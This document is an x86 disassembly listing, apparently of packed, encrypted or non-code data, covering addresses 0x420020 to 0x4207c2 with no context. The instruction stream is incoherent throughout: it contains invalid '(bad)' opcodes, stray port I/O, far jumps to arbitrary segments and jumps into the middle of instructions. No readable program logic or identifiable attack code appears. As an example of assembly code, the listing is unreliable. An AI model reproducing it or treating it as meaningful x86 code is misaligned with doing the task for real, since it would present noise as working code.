  420020:	sub    ebx,0xfffffffc
  420023:	mov    eax,0x89d299d0
  420028:	jb     0x41ffe3
  42002a:	aas    
  42002b:	push   ds
  42002c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42002d:	ins    DWORD PTR es:[edi],dx
  42002e:	out    0x11,al
  420030:	shl    DWORD PTR [esi+eax*2-0x825c561],0x2b
  420038:	sub    DWORD PTR [esi],0x2a
  42003b:	dec    ebx
  42003c:	pop    ebp
  42003d:	in     al,dx
  42003e:	into   
  42003f:	pop    esi
  420040:	cmp    dl,BYTE PTR [esi]
  420042:	cdq    
  420043:	cmp    al,0xc
  420045:	xor    al,0x85
  420047:	lock xchg ebp,eax
  420049:	dec    eax
  42004a:	fldcw  WORD PTR [ebx]
  42004c:	ret    0xee21
  42004f:	and    ch,BYTE PTR [ecx+0x45d2a21d]
  420055:	in     al,0xf1
  420057:	mov    ds:0xc265efab,eax
  42005c:	jg     0x42006f
  42005e:	mov    bh,0x5c
  420060:	xor    BYTE PTR [esi+0x3cac029f],al
  420066:	jmp    0x420076
  420068:	ss stos BYTE PTR es:[edi],al
  42006a:	dec    ebx
  42006b:	sti    
  42006c:	or     BYTE PTR [ebp+0x4d],bh
  42006f:	mov    ds:0x6848ddb0,al
  420074:	sahf   
  420075:	sbb    BYTE PTR [eax-0x5cdf0bd4],ah
  42007b:	push   0x2d
  42007d:	(bad)  
  42007e:	jp     0x4200d6
  420080:	ret    
  420081:	fwait
  420082:	or     edx,DWORD PTR [edx+0x37]
  420085:	cwde   
  420086:	push   ebx
  420087:	pop    ds
  420088:	add    al,0x58
  42008a:	push   ss
  42008b:	dec    ebx
  42008c:	push   edi
  42008d:	jecxz  0x4200b0
  42008f:	and    eax,ecx
  420091:	push   ds
  420092:	(bad)  
  420093:	outs   dx,BYTE PTR ds:[esi]
  420094:	clc    
  420095:	(bad)  
  420096:	fwait
  420097:	sub    eax,0xc3bd07de
  42009c:	mov    ds,WORD PTR [esi]
  42009e:	out    0x3f,eax
  4200a0:	lods   al,BYTE PTR ds:[esi]
  4200a1:	loope  0x420072
  4200a3:	inc    edi
  4200a4:	es in  al,dx
  4200a6:	sbb    DWORD PTR [ebx+0x75],esi
  4200a9:	repnz mov cl,0xbc
  4200ac:	test   eax,0x1a99bcaf
  4200b1:	inc    esi
  4200b2:	mul    BYTE PTR [edx+0x34e25e4b]
  4200b8:	xchg   ecx,eax
  4200b9:	cmc    
  4200ba:	mov    ebx,0x6d6552f0
  4200bf:	inc    eax
  4200c0:	out    0x4e,eax
  4200c2:	fistp  DWORD PTR [ebp+edi*4+0x4f]
  4200c6:	push   cs
  4200c7:	or     BYTE PTR gs:[ebp+eiz*2-0x30],bh
  4200cc:	sbb    eax,0x3b0a8328
  4200d1:	pop    esp
  4200d2:	aam    0x5
  4200d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200d5:	or     BYTE PTR [edx-0x35c226d0],ah
  4200db:	addr16 retf 0x8bdd
  4200df:	mov    cl,0x98
  4200e1:	and    edi,DWORD PTR [esi-0x1cd0a1b6]
  4200e7:	cmp    eax,0x4ec76b5c
  4200ec:	add    eax,0x76fc94f9
  4200f1:	(bad)  [ecx+0x5496539a]
  4200f7:	test   BYTE PTR [esi+0x0],al
  4200fa:	dec    ecx
  4200fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200fc:	mov    edi,0xe325326c
  420101:	or     ebx,DWORD PTR [esp+edx*1+0x2a]
  420105:	lods   al,BYTE PTR ds:[esi]
  420106:	mov    al,0xd5
  420108:	icebp  
  420109:	xor    bl,BYTE PTR [eax-0x66]
  42010c:	or     DWORD PTR [esi+0x31],ecx
  42010f:	mov    ah,0x4e
  420111:	hlt    
  420112:	pop    ds
  420113:	jmp    0x29fc:0x17b23299
  42011a:	xchg   ebp,eax
  42011b:	or     bh,BYTE PTR [esi]
  42011d:	jne    0x4200cc
  42011f:	xchg   ebp,eax
  420120:	mov    bl,0xbb
  420122:	inc    edx
  420123:	jnp    0x420183
  420125:	shl    BYTE PTR [ebx+0x7e],0xa3
  420129:	(bad)  
  42012a:	int    0x82
  42012c:	pusha  
  42012d:	jg     0x420126
  42012f:	ins    BYTE PTR es:[edi],dx
  420130:	xchg   edx,eax
  420131:	add    eax,0x6aa036db
  420136:	dec    edi
  420137:	lock sub ebx,esp
  42013a:	lea    edi,[edi+0xdc39b0d]
  420140:	loope  0x4200d9
  420142:	adc    eax,0xe8c9236e
  420147:	cs dec eax
  420149:	push   edi
  42014a:	test   al,0x44
  42014c:	repz stc 
  42014e:	or     eax,0x528f0abe
  420153:	in     al,0x31
  420155:	fsubr  DWORD PTR [ecx]
  420157:	rol    DWORD PTR [ebx+0x34],0xeb
  42015b:	call   0x2744:0xaae6be82
  420162:	jns    0x420180
  420164:	cwde   
  420165:	push   0x5d424c13
  42016a:	inc    ecx
  42016b:	imul   ebx,eax,0x21
  42016e:	xor    ch,BYTE PTR [eax+0x6daaddab]
  420174:	out    dx,al
  420175:	inc    ebp
  420176:	cmp    cl,bl
  420178:	ins    DWORD PTR es:[edi],dx
  420179:	xlat   BYTE PTR ds:[ebx]
  42017a:	(bad)  
  42017b:	dec    edx
  42017c:	xchg   esp,eax
  42017d:	mov    dl,0x67
  42017f:	(bad)  [ebx-0x19]
  420182:	mov    eax,DWORD PTR [edi-0x30]
  420185:	dec    edi
  420186:	daa    
  420187:	scas   al,BYTE PTR es:[edi]
  420188:	mov    BYTE PTR [ecx-0x58],ch
  42018b:	sbb    BYTE PTR [edi-0x3a],dh
  42018e:	sbb    eax,DWORD PTR [eax-0x5]
  420191:	jg     0x4201e9
  420193:	int3   
  420194:	xlat   BYTE PTR ds:[ebx]
  420195:	stos   DWORD PTR es:[edi],eax
  420196:	hlt    
  420197:	lods   al,BYTE PTR ds:[esi]
  420198:	and    dh,ah
  42019a:	cdq    
  42019b:	push   cs
  42019c:	pop    ebp
  42019d:	mov    ch,0x61
  42019f:	(bad)  
  4201a0:	sbb    ah,ch
  4201a2:	retf   0xe602
  4201a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201a6:	mov    ebp,0x6e8e4c7d
  4201ab:	mov    eax,0x1443d306
  4201b0:	mul    BYTE PTR [eax+0x19]
  4201b3:	outs   dx,DWORD PTR ds:[esi]
  4201b4:	jg     0x420153
  4201b6:	fsubr  QWORD PTR [ebx-0x2628039a]
  4201bc:	push   ebx
  4201bd:	daa    
  4201be:	(bad)  
  4201bf:	bound  ebp,QWORD PTR [ebp+0x783bd878]
  4201c5:	ret    0x634f
  4201c8:	sub    al,0xc7
  4201ca:	out    0x67,al
  4201cc:	push   ebp
  4201cd:	cmp    ch,dh
  4201cf:	push   edi
  4201d0:	push   es
  4201d1:	cmp    eax,DWORD PTR [eax-0x33]
  4201d4:	pushf  
  4201d5:	sbb    eax,0xe04548f1
  4201da:	out    0x5d,eax
  4201dc:	sar    BYTE PTR [ebx],0x1d
  4201df:	icebp  
  4201e0:	lea    edx,[ebp+0x683eb606]
  4201e6:	add    al,0x3e
  4201e8:	int3   
  4201e9:	pop    ss
  4201ea:	add    eax,0x4cbacbb8
  4201ef:	sbb    BYTE PTR [ecx],0x48
  4201f2:	and    al,0x3b
  4201f4:	xchg   edx,eax
  4201f5:	sub    eax,0xb088bd43
  4201fa:	adc    bl,0xa2
  4201fd:	push   ebp
  4201fe:	jmp    DWORD PTR [edx+0x2b]
  420201:	push   0x95ee7123
  420206:	push   ds
  420207:	popa   
  420208:	imul   eax,DWORD PTR ds:0x498bb512,0x5bb854c7
  420212:	xchg   al,bh
  420214:	pop    esp
  420215:	adc    ecx,DWORD PTR [edi-0x77d42aea]
  42021b:	std    
  42021c:	inc    eax
  42021d:	inc    esp
  42021e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42021f:	retf   
  420220:	cld    
  420221:	popa   
  420222:	cmp    al,0x30
  420224:	mov    al,ds:0x89ce0990
  420229:	cmp    al,0x88
  42022b:	ss daa 
  42022d:	jmp    0x4202ad
  42022f:	push   ss
  420230:	repnz shl BYTE PTR [ebx],cl
  420233:	fnstenv [edi]
  420235:	add    al,0x94
  420237:	add    cl,cl
  420239:	pop    ecx
  42023a:	repz push esp
  42023c:	stos   DWORD PTR es:[edi],eax
  42023d:	test   al,0x26
  42023f:	inc    ebp
  420240:	xlat   BYTE PTR ds:[ebx]
  420241:	pop    ebp
  420242:	jmp    ecx
  420244:	mov    es,WORD PTR [eax]
  420246:	mov    dl,0x6b
  420248:	loop   0x420286
  42024a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42024b:	inc    ecx
  42024c:	in     al,0x9f
  42024e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42024f:	push   0x2caffc07
  420254:	in     eax,0xd3
  420256:	cli    
  420257:	pmaxsw mm2,mm7
  42025a:	sbb    DWORD PTR [edi+0x33],edi
  42025d:	icebp  
  42025e:	or     eax,edx
  420260:	add    al,bl
  420262:	outs   dx,BYTE PTR ds:[esi]
  420263:	enter  0x67bb,0xb7
  420267:	mov    BYTE PTR [edi],dh
  420269:	aam    0x22
  42026b:	sbb    ecx,DWORD PTR [edx+0x79857d81]
  420271:	push   ss
  420272:	int3   
  420273:	xor    al,0xa3
  420275:	outs   dx,BYTE PTR ds:[esi]
  420276:	xlat   BYTE PTR ds:[ebx]
  420277:	push   eax
  420278:	dec    edx
  420279:	mov    bl,0xe0
  42027b:	sbb    eax,0x5e1f6faa
  420280:	dec    eax
  420281:	gs pop ss
  420283:	cld    
  420284:	rcr    DWORD PTR ds:0xb1e95597,0xa8
  42028b:	xor    ebp,DWORD PTR [edx-0x709dd3b0]
  420291:	sub    cl,BYTE PTR [esp+esi*4+0xb]
  420295:	inc    ebp
  420296:	push   ds
  420297:	mov    dl,BYTE PTR [ebx-0x33a41f75]
  42029d:	push   edi
  42029e:	cmp    bh,BYTE PTR [edx-0x2637e42b]
  4202a4:	test   BYTE PTR [eax-0x9],ah
  4202a7:	sahf   
  4202a8:	(bad)  
  4202a9:	lock xchg ecx,eax
  4202ab:	retf   
  4202ac:	xor    BYTE PTR [esi-0x1880205f],0x5e
  4202b3:	dec    ecx
  4202b4:	in     eax,dx
  4202b5:	mov    ds:0xcc846fd5,al
  4202ba:	jl     0x420265
  4202bc:	bswap  esp
  4202be:	mov    dh,BYTE PTR [eax-0x7b]
  4202c1:	xchg   ebx,eax
  4202c2:	sahf   
  4202c3:	xor    al,0x87
  4202c5:	xchg   ebx,eax
  4202c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202c7:	(bad)  
  4202c9:	dec    ebx
  4202ca:	mov    bl,0xcc
  4202cc:	cmp    DWORD PTR [eax+0x2e],ebp
  4202cf:	lock inc ebp
  4202d1:	(bad)  
  4202d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202d3:	jne    0x4202bf
  4202d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202d6:	cmp    ecx,DWORD PTR [ebp+0xc839be4]
  4202dc:	(bad)  
  4202dd:	pop    edx
  4202de:	mov    bl,0xb
  4202e0:	pusha  
  4202e1:	int3   
  4202e2:	(bad)  
  4202e4:	sbb    BYTE PTR [edi-0x2c68ba85],ch
  4202ea:	mov    bl,0xf5
  4202ec:	iret   
  4202ed:	fyl2x  
  4202ef:	cmp    ebp,DWORD PTR [ebp-0x35fe0acf]
  4202f5:	in     al,0xb6
  4202f7:	aad    0x59
  4202f9:	neg    dl
  4202fb:	sub    esp,DWORD PTR [ebx]
  4202fd:	loopne 0x4202c7
  4202ff:	shl    BYTE PTR [ebx+0x5e],0x32
  420303:	cmp    ecx,DWORD PTR [ebp+0xd]
  420306:	aas    
  420307:	xor    BYTE PTR [esi+0x7],0x7a
  42030b:	xor    eax,0xbe307e28
  420310:	xchg   ebx,eax
  420311:	retf   
  420312:	mov    al,0xaa
  420314:	xor    al,0x9f
  420316:	mov    dl,0xd4
  420318:	out    0x27,al
  42031a:	inc    ecx
  42031b:	jo     0x4202bf
  42031d:	ret    0x4a44
  420320:	fisub  DWORD PTR [ebx]
  420322:	in     al,0xc2
  420324:	jae    0x4202ed
  420326:	inc    eax
  420327:	arpl   WORD PTR [edx+0x49],sp
  42032a:	dec    edx
  42032b:	popf   
  42032c:	scas   al,BYTE PTR es:[edi]
  42032d:	push   eax
  42032e:	sbb    al,0xf8
  420330:	xor    ch,bh
  420332:	sbb    eax,0x27fadce2
  420337:	and    al,0xfb
  420339:	lods   al,BYTE PTR ds:[esi]
  42033a:	rcr    DWORD PTR [ecx-0x64fc289a],0x5e
  420341:	(bad)  
  420343:	popf   
  420344:	or     ebp,DWORD PTR [edx+0x51]
  420347:	test   eax,0x8d4fd59f
  42034c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42034d:	pop    edi
  42034e:	push   ecx
  42034f:	repz sbb al,0x8e
  420352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420353:	std    
  420354:	dec    ebp
  420355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420356:	stc    
  420357:	add    DWORD PTR cs:[edx],eax
  42035a:	and    DWORD PTR [ebx],0x5a607e3a
  420360:	sahf   
  420361:	xchg   edi,eax
  420362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420363:	or     BYTE PTR [ebp+0x10f23ea],ah
  420369:	gs pop eax
  42036b:	xor    ecx,DWORD PTR [eax-0x44]
  42036e:	xor    dh,BYTE PTR [edi]
  420370:	lods   al,BYTE PTR ds:[esi]
  420371:	adc    DWORD PTR [ebx-0x573e6c3e],esi
  420377:	jg     0x4203bf
  420379:	xor    edi,DWORD PTR [esp-0x9]
  42037d:	pop    ebp
  42037e:	cmp    ch,al
  420380:	push   ebp
  420381:	loop   0x4203ec
  420383:	pop    ebp
  420384:	mov    edi,0x74db5bcd
  420389:	mov    al,0x7f
  42038b:	jbe    0x420364
  42038d:	lock stos DWORD PTR es:[edi],eax
  42038f:	in     al,dx
  420390:	daa    
  420391:	outs   dx,BYTE PTR ds:[esi]
  420392:	sbb    al,0x80
  420394:	jb     0x4203b6
  420396:	stc    
  420397:	xchg   esp,eax
  420398:	push   edx
  420399:	or     al,0xd7
  42039b:	push   cs
  42039c:	out    0x73,al
  42039e:	rol    ebp,1
  4203a0:	inc    edi
  4203a1:	or     eax,0xa6416fbd
  4203a6:	push   ebp
  4203a7:	inc    eax
  4203a8:	repz je 0x4203e8
  4203ab:	jnp    0x4203e0
  4203ad:	test   al,0xe9
  4203af:	lock ins DWORD PTR es:[edi],dx
  4203b1:	push   cs
  4203b2:	xor    al,0x9a
  4203b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203b5:	js     0x420383
  4203b7:	jp     0x420363
  4203b9:	mov    DWORD PTR [esi-0x63],edx
  4203bc:	xlat   BYTE PTR ds:[ebx]
  4203bd:	inc    esp
  4203be:	jg     0x4203e7
  4203c0:	mov    ds:0x60283934,eax
  4203c5:	inc    edx
  4203c6:	push   cs
  4203c7:	inc    edx
  4203c8:	int    0x63
  4203ca:	cli    
  4203cb:	sbb    eax,0x244476d2
  4203d0:	leave  
  4203d1:	cld    
  4203d2:	rcr    ebp,cl
  4203d4:	mov    eax,ds:0xe5821dea
  4203d9:	aas    
  4203da:	retf   
  4203db:	pop    ebp
  4203dc:	and    eax,0x7ec89abb
  4203e1:	dec    esp
  4203e2:	cld    
  4203e3:	cld    
  4203e4:	stos   BYTE PTR es:[edi],al
  4203e5:	jae    0x420444
  4203e7:	ror    BYTE PTR [esi],0xfd
  4203ea:	ins    BYTE PTR es:[edi],dx
  4203eb:	xor    al,0xb2
  4203ed:	mul    BYTE PTR [edx]
  4203ef:	stos   BYTE PTR es:[edi],al
  4203f0:	and    eax,0x687aed4
  4203f5:	shl    BYTE PTR [edx+edi*1-0x2d719c13],0xa2
  4203fd:	sbb    edi,eax
  4203ff:	int3   
  420400:	xchg   esi,eax
  420401:	fldenv [eax+0x314c0d8e]
  420407:	inc    ebp
  420408:	leave  
  420409:	jbe    0x420452
  42040b:	push   ss
  42040c:	pop    edi
  42040d:	mov    ds:0xde9b2acf,al
  420412:	mov    ebx,0x160e010c
  420417:	jmp    0x42041e
  420419:	sub    edx,DWORD PTR [ebp+0x62649167]
  42041f:	pop    ebx
  420420:	int3   
  420421:	pop    ebx
  420422:	xchg   ebp,eax
  420423:	mov    dh,0x5d
  420425:	adc    eax,0x2db53587
  42042a:	jo     0x420490
  42042c:	inc    ebp
  42042d:	xchg   edx,eax
  42042e:	add    ch,BYTE PTR [esi-0x8]
  420431:	call   0x74a1:0x6e011f5b
  420438:	lock mov eax,0x657443dd
  42043e:	push   ebp
  42043f:	sti    
  420440:	lea    ebx,[ebx-0x1c]
  420443:	mov    edx,0x1e34b7fb
  420448:	and    al,0x3a
  42044a:	sbb    dl,BYTE PTR [ebp+0x12]
  42044d:	dec    eax
  42044e:	retf   
  42044f:	inc    ebp
  420450:	inc    ebx
  420451:	ss cmc 
  420453:	adc    BYTE PTR [eax],ah
  420455:	jns    0x4204a4
  420457:	imul   eax,DWORD PTR [edx-0x5464282d],0x487f063c
  420461:	jle    0x4204d3
  420463:	js     0x4204c3
  420465:	fadd   QWORD PTR [eax+0x42ea2636]
  42046b:	push   cs
  42046c:	bound  ebp,QWORD PTR [esi]
  42046e:	retf   0x3e62
  420471:	call   0x4d426958
  420476:	mov    eax,ds:0x1f6261a7
  42047b:	dec    ebp
  42047c:	icebp  
  42047d:	jns    0x420451
  42047f:	pop    edx
  420480:	int    0x85
  420482:	cmc    
  420483:	sub    BYTE PTR [edi-0x7548c49e],dl
  420489:	xor    edi,DWORD PTR ds:0x4783f61c
  42048f:	inc    edx
  420490:	add    al,0x7e
  420492:	adc    al,0x93
  420494:	stos   BYTE PTR es:[edi],al
  420495:	ins    BYTE PTR es:[edi],dx
  420496:	mov    esp,0x9c37da1c
  42049b:	ins    DWORD PTR es:[edi],dx
  42049c:	xchg   ecx,eax
  42049d:	xchg   edx,eax
  42049e:	push   ebp
  42049f:	sub    cl,ch
  4204a1:	mov    WORD PTR [eax+edi*2-0x68],gs
  4204a5:	xchg   edx,eax
  4204a6:	jns    0x420476
  4204a8:	or     eax,0x937377ff
  4204ad:	iret   
  4204ae:	mov    ds:0x1847d43,eax
  4204b3:	in     eax,dx
  4204b4:	imul   esp,DWORD PTR [edx],0xe431e54d
  4204ba:	dec    esp
  4204bb:	js     0x4204f8
  4204bd:	jmp    0x8a94:0x130cc517
  4204c4:	add    al,0xf4
  4204c6:	mov    BYTE PTR es:[ebx],bl
  4204c9:	mov    ch,BYTE PTR fs:[edi]
  4204cc:	pop    ss
  4204cd:	add    eax,0x8634a776
  4204d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204d3:	(bad)  
  4204d4:	idiv   DWORD PTR [ebp-0x28]
  4204d7:	sub    eax,DWORD PTR [eax]
  4204d9:	mov    WORD PTR [eax-0x3ad67d72],gs
  4204df:	inc    ecx
  4204e0:	lods   eax,DWORD PTR ds:[esi]
  4204e1:	dec    ebx
  4204e2:	inc    edx
  4204e3:	cwde   
  4204e4:	adc    eax,0x1a931e4b
  4204e9:	push   edi
  4204ea:	push   ds
  4204eb:	out    0xb,al
  4204ed:	lods   eax,DWORD PTR ds:[esi]
  4204ee:	or     ecx,DWORD PTR [eax-0x4872646e]
  4204f4:	mov    ebp,0x40529e87
  4204f9:	js     0x420540
  4204fb:	push   ebx
  4204fc:	mov    al,0x3b
  4204fe:	ja     0x4204d6
  420500:	ins    BYTE PTR es:[edi],dx
  420501:	mov    ecx,0xe149493a
  420506:	push   esp
  420507:	mov    bl,0xe5
  420509:	mov    esp,0x695fad80
  42050e:	or     DWORD PTR [esi+0x307b50cd],ecx
  420514:	add    esi,DWORD PTR [ebp+0x695e6e0f]
  42051a:	aad    0xd0
  42051c:	dec    edx
  42051d:	add    DWORD PTR [ebx+edx*4],edx
  420520:	sub    eax,0x6f5032bd
  420525:	retf   0x369
  420528:	and    BYTE PTR [eax+0x3d],dl
  42052b:	scas   eax,DWORD PTR es:[edi]
  42052c:	fisubr DWORD PTR [eax+0x6a2e58ae]
  420532:	jmp    0x4204c9
  420534:	jecxz  0x42050b
  420536:	aad    0xe1
  420538:	add    esi,ebx
  42053a:	adc    al,0xd
  42053c:	leave  
  42053d:	xchg   DWORD PTR [ecx+esi*4-0x10ebb6e],ecx
  420544:	pop    ebx
  420545:	push   ss
  420546:	mov    eax,0x27630f63
  42054b:	call   0x31a556e6
  420550:	sub    al,BYTE PTR [esi-0x24e15a65]
  420556:	pop    ebp
  420557:	add    al,bh
  420559:	jmp    0x8e8aa0cc
  42055e:	lds    edx,FWORD PTR [ebx+ecx*4-0x69]
  420562:	add    ah,BYTE PTR [edx+0x77f7ad7b]
  420568:	or     BYTE PTR [edx-0xd348d3f],ah
  42056e:	jge    0x42057d
  420570:	out    0x5f,eax
  420572:	rcr    BYTE PTR [edx+ebp*8],0xaa
  420576:	mov    eax,DWORD PTR [edi-0x4569fb3]
  42057c:	arpl   cx,ax
  42057e:	mov    ds,WORD PTR [ebp+0x371829bf]
  420584:	dec    ecx
  420585:	pop    edx
  420586:	cmp    DWORD PTR [edi+0x5830e8ba],0x2e6f2e29
  420590:	int3   
  420591:	ficomp DWORD PTR fs:[edi+0x414fdad6]
  420598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420599:	jp     0x42057b
  42059b:	sahf   
  42059c:	mov    ch,0xb0
  42059e:	loop   0x42053c
  4205a0:	mov    DWORD PTR ds:0x8c81254d,edx
  4205a6:	mov    ah,0xe7
  4205a8:	xchg   esp,eax
  4205a9:	dec    ecx
  4205aa:	or     esp,DWORD PTR [ebp+0x1e]
  4205ad:	(bad)  
  4205ae:	fdiv   DWORD PTR [edx-0x3d]
  4205b1:	addr16 pop edi
  4205b3:	retf   0xeb24
  4205b6:	imul   edi,DWORD PTR [edi],0x321d84de
  4205bc:	mov    dl,0xf5
  4205be:	inc    eax
  4205bf:	dec    ecx
  4205c0:	adc    DWORD PTR [ecx],0xffffff82
  4205c3:	jnp    0x420624
  4205c5:	sub    bh,BYTE PTR [esi]
  4205c7:	outs   dx,BYTE PTR ds:[esi]
  4205c8:	icebp  
  4205c9:	ja     0x4205a3
  4205cb:	outs   dx,DWORD PTR ds:[esi]
  4205cc:	pop    ss
  4205cd:	int3   
  4205ce:	xchg   DWORD PTR [edx-0x6b],ecx
  4205d1:	push   esp
  4205d2:	push   ss
  4205d3:	bound  ebx,QWORD PTR [esp+ecx*4]
  4205d6:	pop    ss
  4205d7:	outs   dx,DWORD PTR ds:[esi]
  4205d8:	in     eax,0x97
  4205da:	daa    
  4205db:	pop    ss
  4205dc:	test   BYTE PTR [ecx-0x288ddb48],bh
  4205e2:	push   0xffffffdb
  4205e4:	ins    BYTE PTR es:[edi],dx
  4205e5:	sbb    DWORD PTR [eax+eax*8],ecx
  4205e8:	ds loopne 0x42062d
  4205eb:	mov    edi,0x78d4a55
  4205f0:	test   al,0xfe
  4205f2:	pop    edx
  4205f3:	arpl   WORD PTR [ebx-0x20],cx
  4205f6:	and    ebp,esi
  4205f8:	dec    esi
  4205f9:	imul   edi,DWORD PTR [edi-0x30ae8721],0xdc1c4dd8
  420603:	pop    ds
  420604:	xchg   edx,eax
  420605:	cmp    DWORD PTR [ebp+0x61325d2a],esi
  42060b:	pop    edi
  42060c:	repnz pop edi
  42060e:	cmp    BYTE PTR [ecx+0x1bf483cd],0x11
  420615:	sbb    esi,DWORD PTR [ebx+0x668d6a04]
  42061b:	aad    0xf8
  42061d:	sbb    esi,DWORD PTR [ebx+0x13a30bb9]
  420623:	cmp    DWORD PTR [esi+esi*8],0x39
  420627:	fidivr WORD PTR [ebp-0x671bb38b]
  42062d:	or     eax,0x34e941e1
  420632:	pop    edi
  420633:	lods   al,BYTE PTR ds:[esi]
  420634:	add    eax,0x7c357a34
  420639:	mov    dl,0xe1
  42063b:	in     al,dx
  42063c:	(bad)  
  42063d:	xor    al,0xc0
  42063f:	jbe    0x420649
  420641:	dec    ecx
  420642:	sahf   
  420643:	add    DWORD PTR ds:0xe9b9832b,ebx
  420649:	cmc    
  42064a:	inc    ebx
  42064b:	(bad)  
  42064d:	sar    BYTE PTR [eax+0x2b687684],0xb6
  420654:	inc    edi
  420655:	rcr    DWORD PTR [eax-0x2d7ebb60],0xc8
  42065c:	fcom   QWORD PTR [ecx+edi*4-0x2b9eb8f7]
  420663:	jbe    0x420637
  420665:	lods   al,BYTE PTR ds:[esi]
  420666:	jno    0x420642
  420668:	test   BYTE PTR fs:[edx+0x34],dh
  42066c:	cs dec esi
  42066e:	in     al,dx
  42066f:	xchg   ebx,eax
  420670:	inc    esi
  420671:	jne    0x420695
  420673:	stos   BYTE PTR es:[edi],al
  420674:	and    BYTE PTR [ebx],al
  420676:	jmp    0xdf8c:0x59900b7d
  42067d:	mov    bl,0x41
  42067f:	pop    ebp
  420680:	lock popa 
  420682:	push   ebx
  420683:	sbb    BYTE PTR [eax],dh
  420685:	cmp    ebp,DWORD PTR [ecx+0x449bc1b]
  42068b:	inc    esi
  42068c:	stc    
  42068d:	add    al,0xa1
  42068f:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  420691:	mov    ecx,ebx
  420693:	adc    edx,DWORD PTR [ebx]
  420695:	fmul   DWORD PTR [ebx+0x3a]
  420698:	pusha  
  420699:	sbb    ch,BYTE PTR [edx+0x7c83b095]
  42069f:	or     eax,ecx
  4206a1:	retf   0x7660
  4206a4:	fstp   DWORD PTR [edx-0x6af1a302]
  4206aa:	and    al,0x57
  4206ac:	lods   al,BYTE PTR ds:[esi]
  4206ad:	mov    BYTE PTR [esi+0x32e0d2d],bh
  4206b3:	push   ebx
  4206b4:	mov    ecx,0x27d3a029
  4206b9:	jno    0x42073a
  4206bb:	sub    DWORD PTR [esi-0x655def62],esp
  4206c1:	das    
  4206c2:	sub    eax,0xa7c668f4
  4206c7:	out    dx,eax
  4206c8:	rcl    edi,cl
  4206ca:	pop    ds
  4206cb:	lods   eax,DWORD PTR ds:[esi]
  4206cc:	jmp    0xc34d8ee1
  4206d1:	loopne 0x420709
  4206d3:	push   ds
  4206d4:	stos   DWORD PTR es:[edi],eax
  4206d5:	dec    edx
  4206d6:	sbb    BYTE PTR [esp+eiz*8-0x7dd04f67],bl
  4206dd:	sub    BYTE PTR [edi],bh
  4206df:	ds mov edi,ss
  4206e2:	(bad)  
  4206e3:	sub    BYTE PTR [ebx+esi*1+0x4d5b97a4],bh
  4206ea:	add    DWORD PTR [edx],eax
  4206ec:	nop
  4206ed:	js     0x420738
  4206ef:	mov    WORD PTR [edx+eiz*2-0x5e49ef92],ds
  4206f6:	dec    esp
  4206f7:	mov    ds:0x80cdbffa,eax
  4206fc:	push   ds
  4206fd:	jb     0x420767
  4206ff:	ds dec edi
  420701:	xor    dh,ah
  420703:	lock pop ebp
  420705:	enter  0xc7d4,0x24
  420709:	inc    ebx
  42070a:	int3   
  42070b:	xchg   BYTE PTR [esi+0x3dd4b89f],ah
  420711:	test   DWORD PTR [ebx],ecx
  420713:	xor    al,0x1
  420715:	ror    DWORD PTR ds:0xf9ed429f,cl
  42071b:	es mov ch,0x1b
  42071e:	lods   eax,DWORD PTR ds:[esi]
  42071f:	mov    dh,0x1c
  420721:	jno    0x42079e
  420723:	or     al,0x6a
  420725:	add    al,0x8d
  420727:	out    dx,al
  420728:	in     eax,0xb
  42072a:	jmp    0x8998ef30
  42072f:	(bad)  
  420730:	leave  
  420731:	(bad)  
  420732:	and    al,0xbd
  420734:	mov    dh,0xbd
  420736:	test   DWORD PTR [ecx-0x61],0x4d0cd336
  42073d:	mov    bh,0x73
  42073f:	scas   al,BYTE PTR es:[edi]
  420740:	push   ss
  420741:	xor    bl,BYTE PTR [edi-0x6a]
  420744:	call   0x4124f24e
  420749:	dec    ebp
  42074a:	cdq    
  42074b:	jmp    0x42071f
  42074d:	xor    cl,BYTE PTR [edx]
  42074f:	enter  0x2734,0x3
  420753:	shl    DWORD PTR [edi],0xbf
  420756:	aad    0x1f
  420758:	jmp    0x348:0x9a39d1d
  42075f:	int3   
  420760:	pop    ebp
  420761:	in     al,0x63
  420763:	js     0x42079f
  420765:	pop    bx
  420767:	mov    ds:0x6dbf94d3,eax
  42076c:	jae    0x420747
  42076e:	retf   0xeb1
  420771:	xchg   ecx,eax
  420772:	xor    al,0x54
  420774:	aas    
  420775:	loope  0x420715
  420777:	xchg   esp,eax
  420778:	xor    al,bh
  42077a:	enter  0x8715,0x10
  42077e:	ins    BYTE PTR es:[edi],dx
  42077f:	ret    
  420780:	aad    0xdf
  420782:	mov    al,ds:0x705a1735
  420787:	clc    
  420788:	adc    DWORD PTR [ecx-0x7c5b2c6d],ebp
  42078e:	cmp    DWORD PTR [edx+0x4ba85e48],edx
  420794:	cmp    BYTE PTR [ebx+0x33786cc8],al
  42079a:	sahf   
  42079b:	data16 mov dh,0x92
  42079e:	inc    esp
  42079f:	sbb    al,0x45
  4207a2:	popf   
  4207a3:	pop    edi
  4207a4:	in     al,0x7c
  4207a6:	dec    ebx
  4207a7:	and    bh,dh
  4207a9:	pop    ebx
  4207aa:	outs   dx,DWORD PTR ds:[esi]
  4207ab:	cwde   
  4207ac:	leave  
  4207ad:	jb     0x42080b
  4207af:	cmp    BYTE PTR [edi-0x22],cl
  4207b2:	cmovns esi,DWORD PTR [edi+0x33]
  4207b6:	add    dh,BYTE PTR [ebx+0x488f5525]
  4207bc:	retf   
  4207bd:	adc    eax,0x12b78586
  4207c2:	xlat   BYTE PTR ds:[ebx]
